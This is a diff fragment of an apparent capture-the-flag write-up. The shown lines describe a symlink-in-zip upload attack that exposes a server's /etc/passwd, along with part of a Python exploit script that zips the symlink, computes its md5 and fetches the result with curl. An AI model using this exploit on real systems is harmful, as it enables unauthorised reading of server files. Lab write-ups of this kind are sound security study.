@@ -51,7 +51,7 @@ so for example if i create this file:
 and upload on the server i will see its /etc/passwd
 i like to automate stuff so i've written this python code to se the file i want:
 	
-```pytohn	
+```python3	
 #!/bin/env python3
 
 import os
@@ -83,7 +83,6 @@ file_md5sum = subprocess.check_output("md5sum test.zip", shell=True, text=True)[
 os.system(f'curl "{url}uploads/{file_md5sum}/{filename}"')
 
 print("\n[*]Exploit by Disturbante")
-
 ```
 this code create the sym link with the path u write, create a zip folder, compute the md5 of the folder,
 upload the file and visit the url created.
